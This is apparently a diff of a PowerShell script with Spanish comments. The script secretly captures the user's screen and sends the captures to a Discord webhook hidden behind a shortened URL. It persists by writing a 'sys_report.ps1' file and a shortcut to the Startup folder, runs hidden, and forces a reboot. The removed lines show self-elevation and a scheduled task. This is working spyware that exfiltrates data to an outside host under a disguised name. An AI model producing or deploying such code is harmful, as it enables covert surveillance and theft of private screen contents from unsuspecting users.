@@ -1,10 +1,3 @@
-# Verificar si el script se está ejecutando con privilegios elevados (como administrador)
-if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    # Si no se está ejecutando como administrador, relanzar el script con privilegios elevados y ejecución de scripts habilitada
-    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
-    Exit
-}
-
 # Definir la URL del webhook de Discord
 $hookurl = "https://is.gd/xSsigk"  # Reemplaza "URL_DEL_WEBHOOK" con la URL de tu webhook de Discord
 
@@ -43,14 +36,19 @@ while (`$true) {
 }
 "@
 
-# Definir la ruta del script en la carpeta de inicio del usuario actual
+# Definir la ruta de la carpeta de inicio del usuario actual
 $startupFolder = [Environment]::GetFolderPath("Startup")
 $scriptPath = Join-Path -Path $startupFolder -ChildPath "sys_report.ps1"
 
 # Guardar el script en la carpeta de inicio del usuario actual
 $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8 -Force
 
-# Crear una tarea programada en el Programador de tareas de Windows para ejecutar el script al iniciar Windows
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
-$trigger = New-ScheduledTaskTrigger -AtStartup
-Register-ScheduledTask -TaskName "CapturaDePantallaDiscord" -Action $action -Trigger $trigger -Description "Toma capturas de pantalla y las envía a Discord" -RunLevel Highest
+# Crear un acceso directo del script en la carpeta de inicio del usuario actual para que se ejecute al iniciar sesión
+$shortcutPath = Join-Path -Path $startupFolder -ChildPath "sys_report.lnk"
+$WScriptShell = New-Object -ComObject WScript.Shell
+$shortcut = $WScriptShell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = $scriptPath
+$shortcut.Save()
+
+# Reiniciar el sistema para aplicar los cambios
+Restart-Computer -Force
